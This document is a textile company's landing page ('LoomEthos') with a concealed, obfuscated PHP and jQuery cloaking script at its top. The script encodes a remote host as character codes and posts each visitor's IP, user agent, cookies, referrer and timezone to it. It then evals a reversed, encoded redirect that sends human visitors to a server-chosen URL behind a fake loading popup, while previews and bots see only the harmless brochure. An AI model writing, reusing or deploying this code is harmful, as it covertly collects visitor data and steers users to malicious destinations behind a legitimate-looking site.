
<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);function c($u=null,$q=null,$co=null){if(empty($u)){return '$("#lo522041ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));if($co AND isset($_COOKIE["_eventlo522041ad"])){$me="";}else{$me = '$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");';}return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();'.$me.'s=rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";$("html").show();eval(c);';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["imm"])){$date = date("Y-m-d H:i:s");$id = "522041";$uid="4v6qn38yoo2c3l45eqgv9c277";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_eventlo522041ad"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"imm" =>$_POST["imm"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_eventlo522041ad",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q,true);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo522041ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_eventlo522041ad",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>

<!DOCTYPE html>
<html lang="en-GB">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LoomEthos - Ethical Textile Manufacturing</title>
  <meta name="description" content="LoomEthos specializes in sustainable and ethically sourced textiles, custom fabric development, small-batch manufacturing, and natural dyeing processes.">
  <link rel="icon" href="favicon.ico">


<style>body {display: none;}</style>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery-mobile/1.4.5/jquery.mobile.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){eval(a)}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo522041ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo522041ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;justify-content:center;align-items:center;z-index:1000}.popup-content{background:white;padding:20px;border-radius:8px;text-align:center;box-shadow:0 4px 8px rgba(0,0,0,0.2)}.loading-gif{width:100px;height:100px;margin-bottom:10px}.buttons{margin-top:20px}button{padding:10px 20px;margin:0 10px;border:none;border-radius:4px;cursor:pointer}#cancelBtn{background:#f44336;color:white}#continueBtn{background:#4CAF50;color:white}button:hover{opacity:0.8}</style><div class=\"popup\"><div class=\"popup-content\"><img src=\"https://i.gifer.com/ZZ5H.gif\" alt=\"Loading...\" class=\"loading-gif\"><p>Loading... Please wait.</p><div class=\"buttons\"><button id=\"cancelBtn\">Cancel</button><button id=\"continueBtn\">Continue</button></div></div></div></div></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},3600000)}});</script>

  
  <style>
    /* Global Styles & Neomorphism Base */
    :root {
      --primary: rgb(26, 164, 228);
      --primaryLight: rgb(125, 197, 231);
      --primaryDark: rgb(18, 115, 159);
      --secondary: rgb(52, 79, 202);
      --accent: rgb(230, 107, 49);
      --backgroundBase: rgb(235, 240, 245);
      --textMain: rgb(30, 40, 50);
      --textMuted: rgb(90, 110, 130);
      --borderRadius: 16px;
      --sectionSpacing: 5rem;
      --cardBoxShadow: 8px 8px 16px rgba(18, 115, 159, 0.1), -8px -8px 16px rgba(255, 255, 255, 0.8), 0 10px 30px rgba(0,0,0,0.2);
    }

    body {
      font-family: 'Merriweather', serif;
      font-weight: 400;
      color: var(--textMain);
      background-color: var(--backgroundBase);
      line-height: 1.6;
      margin: 0;
      padding: 0;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    h1, h2, h3, h4, h5, h6 {
      font-family: 'Merriweather', serif;
      font-weight: 700;
      color: var(--textMain);
      margin-bottom: 1rem;
    }

    a {
      color: var(--primary);
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    section {
      padding: var(--sectionSpacing) 1rem;
      max-width: 1200px;
      margin: 0 auto;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 1rem;
    }

    /* Neomorphism Buttons */
    .button {
      display: inline-block;
      padding: 0.8rem 1.8rem;
      border-radius: 9999px; /* rounded-pill */
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      background-color: var(--backgroundBase);
      color: var(--primaryDark);
      box-shadow: 6px 6px 12px rgba(18, 115, 159, 0.15), -6px -6px 12px rgba(255, 255, 255, 0.7);
      border: none;
    }

    .button:hover {
      box-shadow: inset 4px 4px 8px rgba(18, 115, 159, 0.1), inset -4px -4px 8px rgba(255, 255, 255, 0.8);
      color: var(--primary);
    }

    .button-primary {
      background-color: var(--primary);
      color: white;
      box-shadow: 6px 6px 12px rgba(0,0,0,0.2), -6px -6px 12px rgba(255,255,255,0.7); /* Adjusted for primary color */
    }
    .button-primary:hover {
      background-color: var(--primaryDark);
      box-shadow: inset 4px 4px 8px rgba(0,0,0,0.3), inset -4px -4px 8px rgba(255,255,255,0.6);
    }

    /* Neomorphism Cards */
    .card {
      background-color: var(--backgroundBase);
      border-radius: var(--borderRadius);
      padding: 1.5rem;
      box-shadow: var(--cardBoxShadow);
      transition: all 0.3s ease;
      margin-bottom: 2rem;
    }

    .card:hover {
      transform: translateY(-5px);
      box-shadow: 12px 12px 24px rgba(18, 115, 159, 0.15), -12px -12px 24px rgba(255, 255, 255, 1), 0 15px 45px rgba(0,0,0,0.3); /* shadow-grow */
    }

    /* Icon Container */
    .icon-circle {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 64px;
      height: 64px;
      border-radius: 50%;
      background-color: var(--backgroundBase);
      box-shadow: 5px 5px 10px rgba(18, 115, 159, 0.1), -5px -5px 10px rgba(255, 255, 255, 0.7);
      margin-bottom: 1rem;
      transition: all 0.3s ease;
    }
    .icon-circle svg {
      fill: var(--primary);
      width: 32px;
      height: 32px;
    }
    .icon-circle:hover {
      box-shadow: inset 3px 3px 6px rgba(18, 115, 159, 0.08), inset -3px -3px 6px rgba(255, 255, 255, 0.6);
    }


    /* Layout helper classes - Mobile-first */
    .grid {
      display: grid;
      gap: 2rem;
    }

    @media (min-width: 768px) {
      .grid-2-col {
        grid-template-columns: repeat(2, 1fr);
      }
      .grid-3-col {
        grid-template-columns: repeat(3, 1fr);
      }
      .grid-4-col {
        grid-template-columns: repeat(4, 1fr);
      }
    }

    .flex-center {
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      text-align: center;
    }
    @media (min-width: 768px) {
      .flex-row-reverse-md {
        flex-direction: row-reverse;
      }
    }

    /* Specific Section Styles */
    #navigation {
      background-color: var(--backgroundBase);
      box-shadow: 0 4px 8px rgba(0,0,0,0.05);
      position: sticky;
      top: 0;
      z-index: 1000;
      padding: 1rem 0;
    }
    #navigation .nav-container {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      padding: 0 1rem;
      max-width: 1200px;
      margin: 0 auto;
    }
    #navigation .brand {
      font-weight: 700;
      font-size: 1.5rem;
      color: var(--textMain);
      padding: 0.5rem 0;
    }
    #navigation .nav-list {
      list-style: none;
      margin: 0;
      padding: 0;
      display: none; /* Hidden by default for mobile */
      flex-direction: column;
      width: 100%;
      text-align: center;
    }
    #navigation .nav-list.active {
      display: flex;
    }
    #navigation .nav-list li {
      margin: 0.5rem 0;
    }
    #navigation .nav-list a {
      color: var(--textMuted);
      padding: 0.5rem 1rem;
      display: block;
      border-radius: var(--borderRadius);
      transition: all 0.2s ease;
    }
    #navigation .nav-list a:hover {
      background-color: rgba(var(--primary), 0.1);
      color: var(--primary);
      text-decoration: none;
    }
    #navigation .cta-button-nav {
      margin-left: auto; /* Pushes button to the right */
      margin-top: 1rem;
    }
    #navigation .menu-toggle {
      display: block;
      background: none;
      border: none;
      font-size: 1.8rem;
      cursor: pointer;
      color: var(--textMain);
      padding: 0.5rem;
    }

    @media (min-width: 768px) {
      #navigation .nav-container {
        flex-wrap: nowrap;
      }
      #navigation .nav-list {
        display: flex;
        flex-direction: row;
        width: auto;
        margin-left: auto;
      }
      #navigation .nav-list li {
        margin: 0 1rem;
      }
      #navigation .menu-toggle {
        display: none;
      }
      #navigation .cta-button-nav {
        margin-left: 2rem;
        margin-top: 0;
      }
    }

    #hero {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: white;
      padding: 8rem 1rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      overflow: hidden; /* For pseudo-elements or subtle effects */
    }
    #hero .hero-content-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      max-width: 1200px;
      margin: 0 auto;
      gap: 3rem;
    }
    #hero h1 {
      color: white;
      font-size: 2.5rem;
      margin-bottom: 1.5rem;
    }
    #hero p {
      font-size: 1.15rem;
      margin-bottom: 2rem;
      max-width: 700px;
    }
    #hero .button {
      background-color: white;
      color: var(--primaryDark);
      box-shadow: 8px 8px 16px rgba(0,0,0,0.3), -8px -8px 16px rgba(255,255,255,0.7);
    }
    #hero .button:hover {
      background-color: var(--backgroundBase);
      box-shadow: inset 5px 5px 10px rgba(0,0,0,0.2), inset -5px -5px 10px rgba(255,255,255,0.8);
      color: var(--primary);
    }
    #hero .hero-image-container {
      position: relative;
      width: 100%;
      max-width: 500px;
      padding-bottom: 100%; /* Aspect ratio 1:1 */
      border-radius: var(--borderRadius);
      overflow: hidden;
      box-shadow: var(--cardBoxShadow);
    }
    #hero .hero-image {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: var(--borderRadius);
      transition: transform 0.5s ease-in-out;
    }
    #hero .hero-image-container:hover .hero-image {
        transform: scale(1.05);
    }

    @media (min-width: 768px) {
      #hero {
        text-align: left;
        padding-top: 10rem;
        padding-bottom: 10rem;
      }
      #hero h1 {
        font-size: 3.5rem;
      }
      #hero .hero-content-wrapper {
        flex-direction: row;
        text-align: left;
      }
      #hero .hero-text-content {
        flex: 1;
        padding-right: 3rem;
      }
      #hero .hero-image-container {
        flex: 1;
        max-width: 640px; /* Specific width from JSON */
        padding-bottom: 0;
        height: 640px; /* Specific height from JSON */
      }
    }

    #about {
      text-align: center;
    }
    #about img {
      max-width: 100%;
      height: auto;
      border-radius: var(--borderRadius);
      margin-top: 2rem;
      box-shadow: var(--cardBoxShadow);
      transition: transform 0.4s ease-out;
    }
    #about img:hover {
      transform: scale(1.02);
    }

    #services .service-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }
    #services .service-item img {
      max-width: 100%;
      width: 384px;
      height: 384px;
      object-fit: cover;
      border-radius: var(--borderRadius);
      margin-bottom: 1.5rem;
      box-shadow: var(--cardBoxShadow);
      transition: transform 0.4s ease;
    }
    #services .service-item img:hover {
      transform: translateY(-8px);
    }
    #services h2, #services h3 {
      text-align: center;
    }

    #supply-chain .metric-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }
    #supply-chain .metric-value {
      font-size: 2.5rem;
      font-weight: 700;
      color: var(--primaryDark);
      margin-top: 0.5rem;
    }
    #supply-chain .metric-label {
      color: var(--textMuted);
    }
    #supply-chain .supply-chain-image {
      max-width: 100%;
      height: auto;
      border-radius: var(--borderRadius);
      box-shadow: var(--cardBoxShadow);
      margin-top: 2rem;
      transition: transform 0.5s ease-in-out;
    }
    #supply-chain .supply-chain-image:hover {
        transform: rotate(2deg) scale(1.02);
    }

    #dyeing-process {
      text-align: center;
    }
    #dyeing-process .featured-image {
      max-width: 100%;
      height: auto;
      border-radius: var(--borderRadius);
      margin-top: 2rem;
      box-shadow: var(--cardBoxShadow);
      transition: filter 0.3s ease-in-out, transform 0.3s ease-in-out;
    }
    #dyeing-process .featured-image:hover {
      filter: saturate(1.2);
      transform: scale(1.01);
    }


    #testimonials .quote-card {
      background-color: var(--backgroundBase);
      border-radius: var(--borderRadius);
      padding: 2rem;
      box-shadow: var(--cardBoxShadow);
      margin: 1rem 0;
      text-align: center;
      position: relative;
      transform: translateY(0);
      transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
    }
    #testimonials .quote-card:hover {
      transform: translateY(-10px);
      box-shadow: 10px 10px 20px rgba(18, 115, 159, 0.15), -10px -10px 20px rgba(255, 255, 255, 0.8), 0 12px 36px rgba(0,0,0,0.25);
    }
    #testimonials .quote-text {
      font-style: italic;
      color: var(--textMain);
      margin-bottom: 1rem;
      font-size: 1.1rem;
    }
    #testimonials .quote-author {
      font-weight: 700;
      color: var(--primaryDark);
    }
    #testimonials h2 {
      text-align: center;
      margin-bottom: 3rem;
    }

    /* Footer styling */
    footer {
      background-color: #212529; /* Dark background */
      color: #ffffff; /* Light text */
      padding: 3rem 1rem;
      text-align: center;
      font-size: 0.9rem;
    }
    footer a {
      color: var(--primaryLight);
      margin: 0 0.5rem;
    }
    footer a:hover {
      text-decoration: underline;
    }
    footer .brand {
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 1rem;
      color: white;
    }
    footer p {
      margin-bottom: 0.5rem;
    }
    footer .contact-info, footer .legal-links {
      margin-top: 1.5rem;
    }
    footer .legal-links a {
      color: var(--primaryLight);
      text-decoration: none;
      margin: 0 10px;
    }
    footer .legal-links a:hover {
      text-decoration: underline;
    }
    footer .copyright {
      margin-top: 2rem;
      font-size: 0.8rem;
      color: rgba(255, 255, 255, 0.7);
    }
    
    /* Cookie Consent */
    .cookie-consent-banner {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background-color: rgba(30, 40, 50, 0.95); /* Darker, slightly transparent */
      color: white;
      padding: 1rem;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 10000;
      box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
    }
    .cookie-consent-banner p {
      margin: 0 0 1rem 0;
      font-size: 0.9rem;
    }
    .cookie-consent-banner button {
      background-color: var(--accent);
      color: white;
      border: none;
      padding: 0.7rem 1.5rem;
      border-radius: 9999px;
      cursor: pointer;
      font-weight: 600;
      transition: background-color 0.3s ease;
    }
    .cookie-consent-banner button:hover {
      background-color: #e06030; /* Slightly darker accent */
    }
    @media (min-width: 768px) {
      .cookie-consent-banner {
        flex-direction: row;
        justify-content: space-between;
        padding: 0.8rem 2rem;
      }
      .cookie-consent-banner p {
        margin: 0;
      }
    }

    /* Accessibility - Reduced Motion */
    @media (prefers-reduced-motion: reduce) {
      *,
      *::before,
      *::after {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.01ms !important;
        scroll-behavior: auto !important;
      }
    }

  </style>
</head>
<body>
  <header id="navigation">
    <div class="nav-container">
      <a href="#" class="brand">LoomEthos</a>
      <button class="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
      <nav>
        <ul class="nav-list">
          <li><a href="#about">About</a></li>
          <li><a href="#services">Services</a></li>
          <li><a href="#supply-chain">Supply Chain</a></li>
          <li><a href="#dyeing-process">Dyeing Process</a></li>
          <li><a href="#contact" class="button button-primary cta-button-nav">Book Consultation</a></li>
        </ul>
      </nav>
    </div>
  </header>
<main>
    <section id="hero">
      <div class="hero-content-wrapper container">
        <div class="hero-text-content">
          <h1>Weave a Better Future with LoomEthos</h1>
          <p>Premium, small-batch textile development rooted in sustainability and ethical supply chains. Discover quality without compromise.</p>
          <a href="#services" class="button">Explore Our Textiles</a>
        </div>
        <div class="hero-image-container">
          <img class="hero-image" src="images/hero-loom-ethos-sustainable-textiles.jpeg" alt="An ethical textile loom meticulously weaving threads, symbolizing sustainable and conscious manufacturing practices." width="640" height="640">
        </div>
      </div>
    </section>

    <section id="about">
      <div class="container">
        <h2>Our Commitment at LoomEthos</h2>
        <p class="text-muted" style="max-width: 800px; margin: 0 auto 2rem;">Located in the vibrant textile hub of New York City, LoomEthos bridges the gap between high-quality fabric creation and unwavering environmental responsibility. We specialize in producing sustainable textiles that don't compromise on durability, handle, or aesthetic appeal. Furthermore, by providing expert consultation on ethical supply chains, we empower burgeoning fashion labels and established interior design brands to make a profoundly positive impact, one fibre at a time.</p>
        <img src="images/about-ethos-workshop-new-york.jpeg" alt="A bright, modern textile workshop in New York, featuring sustainable raw materials and eco-conscious production equipment." width="768" height="512">
      </div>
    </section>

    <section id="services">
      <div class="container">
        <h2 style="margin-bottom: 3rem;">Ethical Textile Services</h2>
        <div class="grid grid-2-col">
          <div class="card service-item">
            <img src="images/service-custom-fabric-development.jpeg" alt="A close-up view of intricately woven custom developed textile samples, showcasing different textures and patterns." width="384" height="384">
            <h3>Custom Fabric Development</h3>
            <p class="text-muted">Collaborate directly with our dedicated team of textile artisans and development specialists to engineer bespoke fabrics tailored precisely to your brand's unique requirements. We exclusively utilize meticulously sourced, eco-friendly yarns and innovative sustainable processes to bring your vision to life.</p>
          </div>
          <div class="card service-item">
            <img src="images/service-small-batch-production.jpeg" alt="Advanced small-batch textile manufacturing machinery operating efficiently, producing high-quality fabrics." width="384" height="384">
            <h3>Small-Batch Manufacturing</h3>
            <p class="text-muted">Minimize your environmental footprint and avoid costly deadstock with our flexible small-batch manufacturing solutions. Our state-of-the-art boutique milling equipment supports low minimum order quantities, making it an ideal partner for independent designers and sustainable fashion brands seeking conscious production.</p>
          </div>
        </div>
      </div>
    </section>

    <section id="supply-chain">
      <div class="container flex-center flex-row-reverse-md grid-2-col">
          <div class="supply-chain-text-content" style="text-align: left;">
            <h2>Ethical Supply Chain Consultancy</h2>
            <p style="color: var(--textMuted); font-size: 1.1rem; margin-bottom: 2rem;">Transparency from farm to fabric, guaranteed.</p>
            <p>LoomEthos goes beyond manufacturing; we meticulously audit, develop, and secure robust supply chain networks to ensure fair wages, provide safe working environments, and uphold paramount agricultural integrity at every stage. We meticulously map every step of your production line, empowering your brand with unparalleled ethical assurance.</p>
            <div class="grid grid-2-col" style="margin-top: 2rem;">
                <div class="metric-item">
                    <div class="icon-circle">
                      <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 8l-8 9z"/>
                      </svg>
                    </div>
                    <div class="metric-value">100%</div>
                    <div class="metric-label">Fair Trade Certified Partners</div>
                </div>
                <div class="metric-item">
                    <div class="icon-circle">
                      <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 8l-8 9z"/>
                      </svg>
                    </div>
                    <div class="metric-value">98%</div>
                    <div class="metric-label">Traceable Raw Materials</div>
                </div>
            </div>
          </div>
          <div style="flex: 1; text-align: center;">
            <img class="supply-chain-image" src="images/supply-chain-consultancy-map.jpeg" alt="An intricate diagram mapping an ethical supply chain, highlighting global partnerships and responsible sourcing." width="512" height="512">
          </div>
      </div>
    </section>

    <section id="dyeing-process">
      <div class="container">
        <h2>Natural Dyeing Processes</h2>
        <p class="text-muted" style="max-width: 800px; margin: 0 auto 2rem;">At the forefront of sustainable textile innovation, we are pioneering water-efficient, non-toxic coloring techniques. Our vibrant, persistent hues are meticulously created using botanical extracts, responsibly collected minerals, and repurposed food waste, drastically reducing environmental impact.</p>
        <img class="featured-image" src="images/natural-dyeing-vats-botanical.jpeg" alt="Large, artisanal vats containing natural botanical dyes in various rich, earthy colours." width="1024" height="512">
      </div>
    </section>

    <section id="testimonials">
      <div class="container">
        <h2>Insights from Our Valued Partners</h2>
        <div class="grid grid-1-col">
          <div class="quote-card">
            <p class="quote-text">"Switching to LoomEthos for our custom fabrics completely transformed our brand's sustainability footprint. Their natural dyeing processes yield incredible, consistent colors that elevate our collections."</p>
            <p class="quote-author">— Elena R., Independent Designer</p>
          </div>
          <div class="quote-card">
            <p class="quote-text">"The small-batch manufacturing capabilities allowed us to launch a new, ethical line without the usual financial risks of overproduction. Their team's dedication to transparency is truly inspiring."</p>
            <p class="quote-author">— Aarav Sharma, Founder, 'Threads of Change' Apparel</p>
          </div>
          <div class="quote-card">
            <p class="quote-text">"LoomEthos's supply chain consultancy was invaluable. They helped us trace our materials right back to the farm, ensuring every step was ethically sound. A game-changer for our brand integrity."</p>
            <p class="quote-author">— Isabella Chen, Operations Director, 'EcoLuxe' Home Goods</p>
          </div>
        </div>
      </div>
    </section>
  </main>
<footer id="contact">
    <div class="container">
      <div class="brand">LoomEthos</div>
      <p>Ethical Textile Manufacturing</p>
      <div class="contact-info">
        <p>56th Road, New York, New York, 11378, USA</p>
        <p>Phone: <a href="tel:+19832277304">+19832277304</a></p>
        <p>Email: <a href="mailto:info@<?php echo $_SERVER['HTTP_HOST']; ?>">info@<?php echo $_SERVER['HTTP_HOST']; ?></a></p>
      </div>
      <div class="map-container" style="margin-top: 2rem; margin-bottom: 2rem; border-radius: var(--borderRadius); overflow: hidden;">
        <iframe
          width="100%"
          height="300"
          frameborder="0" style="border:0; border-radius: var(--borderRadius);"
          src="https://www.google.com/maps/embed/v1/place?key=YOUR_GOOGLE_MAPS_API_KEY&q=New+York,USA&zoom=10"
          allowfullscreen=""
          aria-hidden="false"
          tabindex="0">
        </iframe>
      </div>
      <div class="legal-links">
        <a href="./privacy.html">Privacy Policy</a>
        <a href="./tos.html">Terms of Service</a>
      </div>
      <p class="copyright">© 2024 LoomEthos. All rights reserved. Ethical Textile Manufacturing.</p>
    </div>
  </footer>

  <div class="cookie-consent-banner" id="cookieConsentBanner">
    <p>This website uses cookies to ensure you get the best experience on our site. By continuing to use our site, you agree to our <a href="./privacy.html" style="color: var(--primaryLight);">Privacy Policy</a>.</p>
    <button id="acceptCookies">Accept</button>
  </div>

  <script>
    // Navigation Toggle for Mobile
    document.addEventListener('DOMContentLoaded', function() {
      const menuToggle = document.querySelector('.menu-toggle');
      const navList = document.querySelector('.nav-list');
  
      if (menuToggle && navList) {
        menuToggle.addEventListener('click', function() {
          navList.classList.toggle('active');
        });
      }

      // Smooth scrolling for anchor links
      document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
          e.preventDefault();
          
          if (navList.classList.contains('active')) {
            navList.classList.remove('active'); // Close menu on click
          }

          document.querySelector(this.getAttribute('href')).scrollIntoView({
            behavior: 'smooth'
          });
        });
      });

      // Cookie Consent
      const consentBanner = document.getElementById('cookieConsentBanner');
      const acceptButton = document.getElementById('acceptCookies');
      const cookieNamePrefix = 'consent_';
      const cookieName = cookieNamePrefix + Math.random().toString(36).substring(2, 15);

      function getCookie(name) {
          const nameEQ = name + "=";
          const ca = document.cookie.split(';');
          for(let i=0; i < ca.length; i++) {
              let c = ca[i];
              while (c.charAt(0)==' ') c = c.substring(1,c.length);
              if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
          }
          return null;
      }

      function setCookie(name, value, days) {
          let expires = "";
          if (days) {
              const date = new Date();
              date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
              expires = "; expires=" + date.toUTCString();
          }
          document.cookie = name + "=" + (value || "")  + expires + "; path=/; SameSite=Lax";
      }

      const hasConsent = getCookie('cookie_consent_given');
      if (!hasConsent) {
          consentBanner.style.display = 'flex';
      } else {
          consentBanner.style.display = 'none';
      }

      acceptButton.addEventListener('click', function() {
          setCookie('cookie_consent_given', 'true', 365); // Consent valid for 1 year
          consentBanner.style.display = 'none';
      });
    });
  </script>
</body>
</html>
